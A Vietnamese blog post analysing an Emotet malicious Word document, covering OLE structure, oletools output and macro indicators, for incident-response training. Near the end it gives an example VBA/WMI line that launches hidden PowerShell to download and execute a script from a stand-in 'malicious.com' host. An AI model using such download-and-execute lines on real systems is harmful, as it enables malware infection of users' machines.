---
title: Emotet MalDoc Analysis
date: '2025-03-27'
tags: [Technique, malware]
draft: false
summary: Malware analysis
---

![image alt](https://www.goldenfast.net/blog/wp-content/uploads/2020/10/Apa-Itu-Malware.png)

# Introduction

Má»™t trong nhá»¯ng vectÆ¡ lÃ¢y nhiá»…m phá»• biáº¿n nháº¥t trong an ninh máº¡ng lÃ  xÃ¢m nháº­p thÃ´ng qua cÃ¡c `tÃ i liá»‡u Ä‘á»™c háº¡i` Ä‘ang Ä‘Æ°á»£c gá»­i qua cÃ¡c `email lá»«a Ä‘áº£o`. Cá»¥ thá»ƒ, `tÃ i liá»‡u Microsoft Word` thÆ°á»ng Ä‘Æ°á»£c káº» táº¥n cÃ´ng sá»­ dá»¥ng Ä‘á»ƒ che giáº¥u vÃ  phÃ¡t tÃ¡n mÃ£ Ä‘á»™c. CÃ¡c tÃ i liá»‡u Ä‘á»™c háº¡i thÆ°á»ng chá»©a má»™t `liÃªn káº¿t` mÃ  ngÆ°á»i dÃ¹ng pháº£i nháº¥p vÃ o vÃ  nháº­p thÃ´ng tin Ä‘Äƒng nháº­p thÃ´ng qua má»™t trang web giáº£ máº¡o hoáº·c mÃ£ Ä‘á»™c Ä‘Æ°á»£c nhÃºng trong chÃ­nh tÃ i liá»‡u báº±ng cÃ¡ch sá»­ dá»¥ng `Macro`.

Macro Ä‘Æ°á»£c thiáº¿t káº¿ Ä‘á»ƒ giÃºp ngÆ°á»i dÃ¹ng `tá»± Ä‘á»™ng hÃ³a vÃ  Ä‘Æ¡n giáº£n hÃ³a` cÃ¡c tÃ¡c vá»¥ báº±ng cÃ¡ch sá»­ dá»¥ng mÃ£ `VBA (Visual Basic for Applications)`. Theo máº·c Ä‘á»‹nh, ngÆ°á»i dÃ¹ng cáº§n cháº¥p nháº­n viá»‡c thá»±c thi macro khi má»Ÿ tÃ i liá»‡u Ä‘á»ƒ tÃ i liá»‡u Ä‘Ã³ thá»±c thi mÃ£. Tuy nhiÃªn, Ä‘iá»u nÃ y váº«n khÃ´ng ngÄƒn cáº£n ká»¹ thuáº­t nÃ y trá»Ÿ thÃ nh má»™t trong nhá»¯ng phÆ°Æ¡ng phÃ¡p thÃ nh cÃ´ng vÃ  nguy hiá»ƒm nháº¥t hiá»‡n cÃ³.

**KÄ© thuáº­t MITRE ATT & CK**

[T1566.001 â€“ Lá»«a Ä‘áº£o: Tá»‡p Ä‘Ã­nh kÃ¨m lá»«a Ä‘áº£o](https://attack.mitre.org/techniques/T1566/001/)

**Má»¥c TiÃªu**

Äiá»u tra má»™t máº«u thá»±c táº¿ cá»§a tÃ i liá»‡u Word Ä‘á»™c háº¡i lÃ  má»™t pháº§n cá»§a chiáº¿n dá»‹ch Emotet xuáº¥t hiá»‡n vÃ o thÃ¡ng 9 nÄƒm 2020 . Emotet lÃ  má»™t trong nhá»¯ng `trojan phá»• biáº¿n nháº¥t`, lÃ¢y nhiá»…m cho má»i ngÆ°á»i trong nhiá»u nÄƒm thÃ´ng qua viá»‡c gá»­i cÃ¡c tÃ i liá»‡u Word Ä‘Æ°á»£c cháº¿ táº¡o Ä‘á»™c háº¡i cÃ³ mÃ£ Macro Ä‘Æ°á»£c nhÃºng Ä‘á»ƒ `táº£i xuá»‘ng trojan Emotet `khi thá»±c thi. Äiá»u tra maldoc vÃ  nhanh chÃ³ng cÃ³ thá»ƒ trÃ­ch xuáº¥t cÃ¡c chá»‰ sá»‘ vÃ  hiá»ƒu hÃ nh vi cá»§a nÃ³ lÃ  ráº¥t quan trá»ng Ä‘á»‘i vá»›i nhiá»u hoáº¡t Ä‘á»™ng á»©ng phÃ³ sá»± cá»‘

# Analysis

**Resources** : [abuse.ch](https://bazaar.abuse.ch/sample/be9534491888cff3e8f85a3833a340d076f227ce551084aa2d7b32dff5561a31/)

XÃ¡c Ä‘á»‹nh `loáº¡i tá»‡p` vÃ  `metadata`

![MÃ´ táº£ áº£nh](/static/images/Blog/maldoc/1.png)

Output cho chÃºng ta tháº¥y tiÃªu Ä‘á» , tÃ¡c giáº£ táº¡o ra file , dáº¥u thá»i gian . Tháº¥y Ä‘Æ°á»£c loáº¡i tá»‡p á»Ÿ Ä‘Ã¢y lÃ  `Composite Document File V2 Document` , cÃ³ nghÄ©a lÃ  `OLE2` cá»§a Microsoft .

OLE ban Ä‘áº§u lÃ  tá»« viáº¿t táº¯t cá»§a `Object Linking and Embedding` vÃ  lÃ  má»™t `Ä‘á»‹nh dáº¡ng vÃ¹ng chá»©a` Ä‘Æ°á»£c Microsoft sá»­ dá»¥ng cho cÃ¡c tÃ i liá»‡u `Office` `(docx, xlsx, v.v.)` vÃ  thÆ° `Outlook`. Äá»‹nh dáº¡ng nÃ y cho phÃ©p cÃ¡c tá»‡p chá»©a cÃ¡c `Ä‘á»‘i tÆ°á»£ng Ä‘Æ°á»£c liÃªn káº¿t` hoáº·c `nhÃºng` Ä‘ang Ä‘Æ°á»£c láº¯p rÃ¡p dÆ°á»›i dáº¡ng cÃ¡c luá»“ng vÃ  lÆ°u trá»¯ riÃªng láº».

Tá»‡p OLE cÃ³ thá»ƒ Ä‘Æ°á»£c coi lÃ  `má»™t há»‡ thá»‘ng tá»‡p nhá»` hoáº·c `má»™t kho lÆ°u trá»¯ Zip`: NÃ³ chá»©a cÃ¡c `luá»“ng dá»¯ liá»‡u` trÃ´ng giá»‘ng nhÆ° cÃ¡c `tá»‡p Ä‘Æ°á»£c nhÃºng` trong tá»‡p `OLE file`. Má»—i luá»“ng cÃ³ má»™t tÃªn. VÃ­ dá»¥, `luá»“ng chÃ­nh` cá»§a MS TÃ i liá»‡u Word chá»©a vÄƒn báº£n cá»§a nÃ³ Ä‘Æ°á»£c Ä‘áº·t tÃªn lÃ  "`WordDocument`".

Tá»‡p OLE cÅ©ng cÃ³ thá»ƒ chá»©a cÃ¡c `storages`. **Storages** lÃ  má»™t thÆ° má»¥c mÃ  chá»©a cÃ¡c `luá»“ng` hoáº·c cÃ¡c kho lÆ°u trá»¯ khÃ¡c. VÃ­ dá»¥: má»™t tÃ i liá»‡u MS Word vá»›i Macro VBA cÃ³ má»™t bá»™ nhá»› Ä‘Æ°á»£c gá»i lÃ  "Macros".

CÃ¡c luá»“ng Ä‘áº·c biá»‡t cÃ³ thá»ƒ chá»©a cÃ¡c `thuá»™c tÃ­nh`. Má»™t thuá»™c tÃ­nh cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ lÆ°u trá»¯ thÃ´ng tin nhÆ° metadata cá»§a tÃ i liá»‡u (tiÃªu Ä‘á», tÃ¡c giáº£, ngÃ y táº¡o, v.v.). TÃªn luá»“ng thuá»™c tÃ­nh thÆ°á»ng báº¯t Ä‘áº§u báº±ng kÃ½ tá»± '\x05' (mÃ£ ASCII 5).

Äá»‹nh dáº¡ng nÃ y tÆ°Æ¡ng tá»± nhÆ° má»™t file zip , nÃªn cÃ³ thá»ƒ sá»­ dá»¥ng má»™t cÃ´ng cá»¥ nhÆ° `7zip` vÃ  trÃ­ch xuáº¥t tÃ i liá»‡u `Word` . Cho ta tháº¥y Ä‘Æ°á»£c toÃ n bá»™ cáº¥u trÃºc vÃ  toÃ n bá»™ ná»™i dung cá»§a chÃ­nh tÃ i liá»‡u

    ```bash
    â””â”€$ 7z x mal.doc -omaldoc
    ```

Marcos lÃ  má»™t táº­p há»£p cÃ¡c lá»‡nh tá»± Ä‘á»™ng hÃ³a trong Office, cÃ²n VBA lÃ  má»™t ngÃ´n ngá»¯ láº­p trÃ¬nh Ä‘áº§y Ä‘á»§, má»Ÿ rá»™ng kháº£ nÄƒng cá»§a Macro.

ThÆ° má»¥c `maldoc` sáº½ chá»©a :

- word document structure (WordDocument, Table, Data, Macros, â€¦)
- macro files (náº¿u cÃ³ macro)

`Object Linking and Embedding (OLE) ` lÃ  má»™t cÃ´ng nghá»‡ cá»§a Microsoft dÃ¹ng Ä‘á»ƒ `nhÃºng (embed)` hoáº·c `liÃªn káº¿t (link)` cÃ¡c `object` giá»¯a cÃ¡c á»©ng dá»¥ng. NÃ³ cho phÃ©p nhÃºng ná»™i dung tá»« má»™t á»©ng dá»¥ng nÃ y (vÃ­ dá»¥: Excel, Word) vÃ o má»™t á»©ng dá»¥ng khÃ¡c mÃ  váº«n duy trÃ¬ kháº£ nÄƒng chá»‰nh sá»­a báº±ng á»©ng dá»¥ng gá»‘c.

- NhÃºng má»™t báº£ng Excel vÃ o tÃ i liá»‡u Word.
- NhÃºng má»™t Ä‘á»‘i tÆ°á»£ng ActiveX (nhÆ° Ä‘iá»u khiá»ƒn Ä‘a phÆ°Æ¡ng tiá»‡n, nÃºt báº¥m) vÃ o tÃ i liá»‡u Office.

Trong OLE, `Object (Ä‘á»‘i tÆ°á»£ng)` lÃ  `báº¥t ká»³ pháº§n tá»­` nÃ o Ä‘Æ°á»£c `nhÃºng` hoáº·c liÃªn káº¿t trong tÃ i liá»‡u. Má»—i object cÃ³ thá»ƒ chá»©a dá»¯ liá»‡u, mÃ£ thá»±c thi (macro VBA), hoáº·c cÃ¡c thuá»™c tÃ­nh liÃªn quan.

`VÃ­ dá»¥ `vá» Object trong OLE:

- Embedded Excel Sheet: Má»™t báº£ng tÃ­nh Excel nhÃºng trong Word.
- ActiveX Control: Má»™t button hoáº·c má»™t Ä‘iá»u khiá»ƒn cháº¡y mÃ£ lá»‡nh trong VBA.
- OLE Stream: Má»™t táº­p tin nhÃºng trong tÃ i liá»‡u (nhÆ° hÃ¬nh áº£nh, tá»‡p .exe).

Tá»‡p OLE Ä‘Æ°á»£c tá»• chá»©c nhÆ° má»™t `"há»‡ thá»‘ng tá»‡p thu nhá»"`, gá»“m nhiá»u `stream` (luá»“ng dá»¯ liá»‡u) chá»©a cÃ¡c `object`:

Stream trong OLE Ä‘á» cáº­p Ä‘áº¿n `cÆ¡ cháº¿ xá»­ lÃ½ Ä‘a luá»“ng` trong OLE Ä‘á»ƒ quáº£n lÃ½ `Ä‘á»‘i tÆ°á»£ng nhÃºng` vÃ  `liÃªn káº¿t`. NÃ³ giÃºp cÃ¡c á»©ng dá»¥ng xá»­ lÃ½ cÃ¡c object OLE má»™t cÃ¡ch Ä‘á»™c láº­p mÃ  khÃ´ng lÃ m cháº­m á»©ng dá»¥ng chÃ­nh.

CÃ¡c loáº¡i `Stream` trong OLE

1. Main Stream (luá»“ng chÃ­nh): Xá»­ lÃ½ tÃ i liá»‡u Office (Word, Excel, PowerPoint).
2. Background Stream (luá»“ng ná»n): Xá»­ lÃ½ cáº­p nháº­t dá»¯ liá»‡u tá»« cÃ¡c object OLE liÃªn káº¿t.
3. Stream for ActiveX Controls: Náº¿u tÃ i liá»‡u chá»©a ActiveX, OLE táº¡o luá»“ng riÃªng Ä‘á»ƒ xá»­ lÃ½ nÃ³.

_Khi nhÃºng má»™t file Excel vÃ o Word, Word sáº½ má»Ÿ má»™t luá»“ng riÃªng Ä‘á»ƒ hiá»ƒn thá»‹ ná»™i dung Excel._

```
mal.doc (Tá»‡p OLE chÃ­nh)
â”œâ”€â”€ SummaryInformation (Metadata tÃ i liá»‡u)
â”œâ”€â”€ DocumentSummaryInformation (Metadata nÃ¢ng cao)
â”œâ”€â”€ WordDocument (Ná»™i dung chÃ­nh cá»§a tÃ i liá»‡u)
â”œâ”€â”€ Macros (Storage chá»©a Macro VBA)
â”‚   â”œâ”€â”€ VBA (Storage chá»©a mÃ£ VBA)
â”‚   â”‚   â”œâ”€â”€ _VBA_PROJECT (Stream chÃ­nh cá»§a macro)
â”‚   â”‚   â”œâ”€â”€ Module1 (MÃ£ VBA trong module 1)
â”‚   â”‚   â”œâ”€â”€ Module2 (MÃ£ VBA trong module 2)
â”‚   â”‚   â”œâ”€â”€ dir (ThÃ´ng tin thÆ° má»¥c VBA)
â”‚   â”œâ”€â”€ PROJECT (Cáº¥u hÃ¬nh macro)
â”‚   â”œâ”€â”€ PROJECTwm (ThÃ´ng tin bá»• sung)
â”œâ”€â”€ ObjectPool (Storage chá»©a cÃ¡c Ä‘á»‘i tÆ°á»£ng OLE nhÃºng)
â”‚   â”œâ”€â”€ Obj_1 (Embedded Excel Sheet)
â”‚   â”œâ”€â”€ Obj_2 (ActiveX Control)
```

_Storage giá»‘ng vá»›i thÆ° má»¥c cÃ²n Stream thÃ¬ giá»‘ng vá»›i file_

![image alt](https://bluecapesecurity.com/wp-content/uploads/2021/08/Screen-Shot-2021-08-18-at-9.15.22-PM.png)

Cáº¥u trÃºc nÃ y cho chÃºng ta má»™t` Ã½ tÆ°á»Ÿng khÃ¡ tá»‘t` vá» ná»™i dung cá»§a nÃ³ vÃ  chÃºng ta cÃ³ thá»ƒ tháº¥y ráº±ng cÃ³ `má»™t thÆ° má»¥c Macros` vá»›i cÃ¡c `Ä‘á»‘i tÆ°á»£ng Ä‘Æ°á»£c Ä‘áº·t tÃªn ká»³ láº¡`, trong sá»‘ nhá»¯ng thá»© khÃ¡c. LÆ°u Ã½ ráº±ng cÃ¡c tá»‡p Ä‘áº§u ra váº«n chÆ°a Ä‘Æ°á»£c giáº£i mÃ£ vÃ  sáº½ chá»‰ hiá»ƒn thá»‹ vÃ´ nghÄ©a khi má»Ÿ chÃºng báº±ng trÃ¬nh soáº¡n tháº£o vÄƒn báº£n. ÄÃ¢y lÃ  nÆ¡i chÃºng ta cáº§n sá»­ dá»¥ng cÃ¡c cÃ´ng cá»¥ nhÆ° tiá»‡n Ã­ch "`strings`" cÃ³ thá»ƒ giáº£i mÃ£ vÄƒn báº£n cÃ³ trong cÃ¡c tá»‡p nhá»‹ phÃ¢n.

![image alt](https://olefile.readthedocs.io/en/latest/_images/OLE_VBA_sample.png)

**Kiá»ƒm tra tÃ i liá»‡u**

Äiá»u nÃ y thÆ°á»ng giÃºp cÃ³ Ä‘Æ°á»£c Ã½ tÆ°á»Ÿng chung vÃ  xem liá»‡u cÃ³ cÃ¡c tá»« khÃ³a Ä‘Ã¡ng ngá» hay khÃ´ng, cháº³ng háº¡n nhÆ° "`powershell`", "`wmic`", "`webclient`", v.v., cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ thá»±c thi vÃ  / hoáº·c táº£i xuá»‘ng cÃ¡c táº£i trá»ng bá»• sung

```
strings maldoc.doc | more
```

![image alt](https://hackmd.io/_uploads/SyQYmvF21e.png)

á» Ä‘áº§u tÃ i liá»‡u, cÃ³ má»™t chuá»—i ráº¥t dÃ i dÆ°á»ng nhÆ° lÃ  má»™t loáº¡i máº«u nÃ o Ä‘Ã³.Trong máº«u nÃ y, chÃºng ta chÆ°a thá»ƒ biáº¿t nÃ³ lÃ  gÃ¬, nhÆ°ng trong cÃ¡c trÆ°á»ng há»£p khÃ¡c, Ä‘Ã¢y cÃ³ thá»ƒ lÃ  táº£i trá»ng Ä‘Æ°á»£c mÃ£ hÃ³a `base64` ngay táº¡i Ä‘Ã³

**Sá»­ dá»¥ng oletools Ä‘á»ƒ kiá»ƒm tra vÃ  trÃ­ch xuáº¥t ná»™i dung**

CÃ³ má»™t sá»‘ oletools Ä‘á»ƒ phÃ¢n tÃ­ch cáº¥u trÃºc cá»§a tÃ i liá»‡u:

- `olebrowse`: Má»™t GUI Ä‘Æ¡n giáº£n Ä‘á»ƒ duyá»‡t cÃ¡c tá»‡p OLE (vÃ­ dá»¥: tÃ i liá»‡u MS Word, Excel, Powerpoint), Ä‘á»ƒ xem vÃ  trÃ­ch xuáº¥t cÃ¡c luá»“ng dá»¯ liá»‡u riÃªng láº».
- `olemeta`: Ä‘á»ƒ trÃ­ch xuáº¥t táº¥t cáº£ cÃ¡c thuá»™c tÃ­nh tiÃªu chuáº©n (siÃªu dá»¯ liá»‡u) tá»« cÃ¡c tá»‡p OLE.
- `oletimes`: Ä‘á»ƒ trÃ­ch xuáº¥t dáº¥u thá»i gian táº¡o vÃ  sá»­a Ä‘á»•i cá»§a táº¥t cáº£ cÃ¡c luá»“ng vÃ  lÆ°u trá»¯.
- `oledir`: Ä‘á»ƒ hiá»ƒn thá»‹ táº¥t cáº£ cÃ¡c má»¥c thÆ° má»¥c cá»§a tá»‡p OLE, bao gá»“m cÃ¡c má»¥c tá»± do vÃ  má»“ cÃ´i.
- `olemap`: Ä‘á»ƒ hiá»ƒn thá»‹ báº£n Ä‘á»“ cá»§a táº¥t cáº£ cÃ¡c khu vá»±c trong tá»‡p OLE.

Sá»­ dá»¥ng `oledir` Ä‘á»ƒ cÃ³ cÃ¡i nhÃ¬n tá»•ng quan vá» cáº¥u trÃºc cá»§a tÃ i liá»‡u vÃ  kÃ­ch thÆ°á»›c stream

```
oledir maldoc.docx
```

![image alt](https://hackmd.io/_uploads/SJjO_PYhkg.png)

![image alt](https://hackmd.io/_uploads/H1ziOvY3kg.png)

**Bkc5re_xxwma**
ÄÃ¢y lÃ  má»™t `Storage` cÃ³ tÃªn ngáº«u nhiÃªn . Chá»©a 2 stream con lÃ  `f` vÃ  `o` , chá»‰ ra Ä‘Ã¢y lÃ  má»™t `form object` . Trong tÃ i liá»‡u Office, Form Object cÃ³ thá»ƒ Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ lÆ°u trá»¯ chuá»—i áº©n, biáº¿n mÃ´i trÆ°á»ng hoáº·c mÃ£ Ä‘á»™c.Láº§n xuáº¥t hiá»‡n `thá»© hai `cho biáº¿t` luá»“ng mÃ£ VBA` cÃ³ kÃ­ch thÆ°á»›c Ä‘Ã¡ng ká»ƒ.

**f (Form Data)**: Chá»©a thÃ´ng tin vá» bá»‘ cá»¥c biá»ƒu máº«u hoáº·c dá»¯ liá»‡u áº©n.
**o (Object Data)**: Chá»©a dá»¯ liá»‡u nhá»‹ phÃ¢n cá»§a Ä‘á»‘i tÆ°á»£ng (vÃ­ dá»¥: ActiveX, hÃ¬nh áº£nh, hoáº·c dá»¯ liá»‡u mÃ£ hÃ³a).

**Hacker cÃ³ thá»ƒ lá»£i dá»¥ng Form Object Ä‘á»ƒ giáº¥u payload hoáº·c táº£i xuá»‘ng mÃ£ Ä‘á»™c khÃ¡c.**

ğŸ“Œ **Bkc5re_xxwma (24200 bytes)**

- Chá»©a mÃ£ VBA chÃ­nh, cÃ³ thá»ƒ chá»©a payload Ä‘á»™c háº¡i.
- Ráº¥t cÃ³ thá»ƒ chá»©a code thá»±c thi PowerShell, Shellcode hoáº·c táº£i mÃ£ Ä‘á»™c tá»« internet.

**S88ecjif1ml6** : LÃ  má»™t `stream` Ä‘Æ°á»£c Ä‘áº·t tÃªn ngáº«u nhiÃªn khÃ¡c trong VBA Macro . Cháº¯c cháº¯n cÅ©ng ráº¥t Ä‘Ã¡ng ngá» . KÃ­ch thÆ°á»›c nhá» nhÆ°ng Ä‘Ã¡ng ngá», cÃ³ thá»ƒ lÃ  má»™t Ä‘oáº¡n mÃ£ Ä‘á»™c giÃºp thá»±c thi mÃ£ chÃ­nh.

Cáº§n kiá»ƒm tra ná»™i dung Ä‘á»ƒ xem nÃ³ cÃ³ chá»©a lá»‡nh **AutoOpen()** hay **Document_Open()** khÃ´ng.

**WordDocument**
Stream chá»©a ná»™i dung chÃ­nh cá»§a tÃ i liá»‡u Word

Má»™t sá»‘ `oletools` Ä‘á»ƒ phÃ¢n tÃ­ch ná»™i dung Ä‘á»™c háº¡i cá»§a tÃ i liá»‡u

- **oleid**: Ä‘á»ƒ phÃ¢n tÃ­ch cÃ¡c tá»‡p OLE Ä‘á»ƒ phÃ¡t hiá»‡n cÃ¡c Ä‘áº·c Ä‘iá»ƒm cá»¥ thá»ƒ thÆ°á»ng tháº¥y trong cÃ¡c tá»‡p Ä‘á»™c háº¡i.
- **olevba**: Ä‘á»ƒ trÃ­ch xuáº¥t vÃ  phÃ¢n tÃ­ch mÃ£ nguá»“n VBA Macro tá»« cÃ¡c tÃ i liá»‡u MS Office (OLE vÃ  OpenXML).
- **MacroRaptor**: Ä‘á»ƒ phÃ¡t hiá»‡n Macro VBA Ä‘á»™c háº¡i
- **msodde**: Ä‘á»ƒ phÃ¡t hiá»‡n vÃ  trÃ­ch xuáº¥t cÃ¡c liÃªn káº¿t DDE/DDEAUTO tá»« tÃ i liá»‡u MS Office, RTF vÃ  CSV\*
- **pyxswf**: Ä‘á»ƒ phÃ¡t hiá»‡n, trÃ­ch xuáº¥t vÃ  phÃ¢n tÃ­ch cÃ¡c Ä‘á»‘i tÆ°á»£ng Flash (SWF) cÃ³ thá»ƒ Ä‘Æ°á»£c nhÃºng trong cÃ¡c tá»‡p nhÆ° tÃ i liá»‡u MS Office (vÃ­ dá»¥: Word, Excel) vÃ  RTF, Ä‘áº·c biá»‡t há»¯u Ã­ch cho viá»‡c phÃ¢n tÃ­ch pháº§n má»m Ä‘á»™c háº¡i.
- **oleobj**: Ä‘á»ƒ trÃ­ch xuáº¥t cÃ¡c Ä‘á»‘i tÆ°á»£ng Ä‘Æ°á»£c nhÃºng tá»« cÃ¡c tá»‡p OLE.
- **rtfobj**: Ä‘á»ƒ trÃ­ch xuáº¥t cÃ¡c Ä‘á»‘i tÆ°á»£ng Ä‘Æ°á»£c nhÃºng tá»« cÃ¡c tá»‡p RTF.

Sá»­ dá»¥ng `oleid` Ä‘á»ƒ quÃ©t tá»‡p tÃ¬m báº¥t ká»³ Ä‘áº·c Ä‘iá»ƒm Ä‘á»™c háº¡i nÃ o

```
oleid mal.doc
```

![image alt](https://hackmd.io/_uploads/r19xkdYhyx.png)

`oleid` cÃ³ thá»ƒ phÃ¡t hiá»‡n ra ráº±ng cÃ¡c `Macro` Ä‘Æ°á»£c `nhÃºng` trong tÃ i liá»‡u chá»©a cÃ¡c `tá»« khÃ³a` Ä‘Ã¡ng ngá».

**olevba** lÃ  má»™t cÃ´ng cá»¥ trong oletools, chuyÃªn dÃ¹ng Ä‘á»ƒ **trÃ­ch xuáº¥t** vÃ  **phÃ¢n tÃ­ch** mÃ£ VBA Macro tá»« cÃ¡c tÃ i liá»‡u Microsoft Office nhÆ° .doc, .xls, .ppt.
NgoÃ i viá»‡c in ra mÃ£ nguá»“n VBA, olevba cÃ²n cÃ³ kháº£ nÄƒng:
âœ… PhÃ¡t hiá»‡n hÃ nh vi Ä‘Ã¡ng ngá» (macro cháº¡y mÃ£ Ä‘á»™c, gá»i Windows API).
âœ… Giáº£i mÃ£ cÃ¡c chuá»—i bá»‹ obfuscate (mÃ£ hÃ³a, XOR, Base64, hex encoding).
âœ… TÃ¬m kiáº¿m IOC (Indicators of Compromise) nhÆ° URL Ä‘á»™c háº¡i, lá»‡nh PowerShell, shellcode.

```
olevba mal.doc
```

Äáº§u ra chá»©a 2 VBA Macro , vá»›i hÃ ng ngÃ n cÃ¢u lá»‡nh

![image alt](https://hackmd.io/_uploads/B1mOldKhJx.png)

Thoáº¡t nhÃ¬n, chÃºng ta cÃ³ thá»ƒ tháº¥y ráº±ng mÃ£ cho cáº£ Macro VBA "`S88ecjif1ml6`" vÃ  "`Bkc5re_xxwma`" khÃ¡ khÃ³ hiá»ƒu. NÃ³ bao gá»“m nhiá»u function vÃ  hÃ m biáº¿n ngáº«u nhiÃªn cÃ³ láº½ `khÃ´ng quÃ¡ há»¯u Ã­ch`

```
-------------------------------------------------------------------------------
VBA FORM STRING IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Ny3av00ll97ltoy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Wmyd37gtxrphjkb
-------------------------------------------------------------------------------
VBA FORM STRING IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Tahoma;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Fskdm2zvwtdesh
-------------------------------------------------------------------------------
VBA FORM STRING IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Tahomaï¿½
-------------------------------------------------------------------------------
VBA FORM STRING IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Gg6xs1_7x7ja
-------------------------------------------------------------------------------
VBA FORM Variable "b'Urer04ndu5q_jgnt0'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'Ny3av00ll97ltoy'
-------------------------------------------------------------------------------
VBA FORM Variable "b'G9296_zlvb28jru8'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'Wmyd37gtxrphjkb'
-------------------------------------------------------------------------------
VBA FORM Variable "b'M3sl9apgyan8k'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'P'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Vo_3ycaurbu'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'Fskdm2zvwtdesh'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Ptvl917_3fhv4ghbhb'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'tar'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Ct8nqi_rrjku1h0h'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Ys_jgil82mmhf'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'tu'
-------------------------------------------------------------------------------
VBA FORM Variable "b'E8qursw9anoz'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'Gg6xs1_7x7j'
```

ChÃºng ta cÅ©ng Ä‘Ã£ tháº¥y trÆ°á»›c Ä‘Ã³ ráº±ng OLE bao gá»“m má»™t Ä‘á»‘i tÆ°á»£ng `Form`. "olevba" Ä‘Ã£ cÃ³ thá»ƒ trÃ­ch xuáº¥t má»™t `sá»‘ chuá»—i` vÃ  `biáº¿n` liÃªn quan Ä‘áº¿n biá»ƒu máº«u. Äiá»u nÃ y Ä‘Æ°á»£c biá»ƒu thá»‹ báº±ng cÃ¡c dÃ²ng "`VBA FORM STRING IN`" vÃ  "`VBA FORM Variable`".

`olevba` cÅ©ng cho chÅ©ng ta má»™t báº£n tÃ³m táº¯t nhá» phÃ¡t hiá»‡n á»Ÿ cuá»‘i dá»±a trÃªn cÃ¡c Ä‘áº·c Ä‘iá»ƒm phÃ¡t hiá»‡n cá»§a nÃ³ .

![image alt](https://hackmd.io/_uploads/BJt2WdKn1e.png)

á» Ä‘Ã¢y chÃºng ta cÃ³ thá»ƒ tháº¥y ráº±ng Macro `tá»± Ä‘á»™ng thá»±c thi khi tÃ i liá»‡u Ä‘Æ°á»£c má»Ÿ`. HÆ¡n ná»¯a, cÃ³ má»™t sá»‘ tá»« khÃ³a Ä‘Ã¡ng ngá» thÆ°á»ng Ä‘Æ°á»£c sá»­ dá»¥ng bá»Ÿi cÃ¡c tÃ i liá»‡u Ä‘á»™c háº¡i. Cá»¥ thá»ƒ, thuáº­t ngá»¯ "`Create`" ráº¥t thÃº vá»‹, vÃ¬ nÃ³ thÆ°á»ng Ä‘Æ°á»£c liÃªn káº¿t vá»›i viá»‡c táº¡o má»™t quy trÃ¬nh má»›i báº±ng `WMI`. CÃ¡c tá»« khÃ³a khÃ¡c cÃ³ thá»ƒ Ä‘Æ°á»£c liÃªn káº¿t vá»›i xá»­ lÃ½ Ä‘á»‘i tÆ°á»£ng vÃ  mÃ£ hÃ³a chuá»—i vÃ  xÃ¡o trá»™n.

**WMI (Windows Management Instrumentation)** lÃ  má»™t **framework** cá»§a Windows, cho phÃ©p **quáº£n lÃ½** vÃ  **giÃ¡m sÃ¡t há»‡ thá»‘ng** thÃ´ng qua táº­p lá»‡nh hoáº·c láº­p trÃ¬nh.

âœ… Thá»±c thi lá»‡nh há»‡ thá»‘ng tá»« xa hoáº·c cá»¥c bá»™ (vÃ­ dá»¥: khá»Ÿi Ä‘á»™ng/quáº£n lÃ½ tiáº¿n trÃ¬nh).
âœ… Thu tháº­p thÃ´ng tin há»‡ thá»‘ng (phiÃªn báº£n Windows, danh sÃ¡ch tiáº¿n trÃ¬nh, tráº¡ng thÃ¡i dá»‹ch vá»¥).
âœ… TÆ°Æ¡ng tÃ¡c vá»›i Registry, Event Logs, dá»‹ch vá»¥ Windows.

Má»™t vÃ­ dá»¥ vá» `WMI` táº¡o ra process vÃ  download má»™t tá»‡p Ä‘á»™c háº¡i

```
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set objProcess = objWMIService.Get("Win32_Process")
objProcess.Create "cmd.exe /c powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')"
```

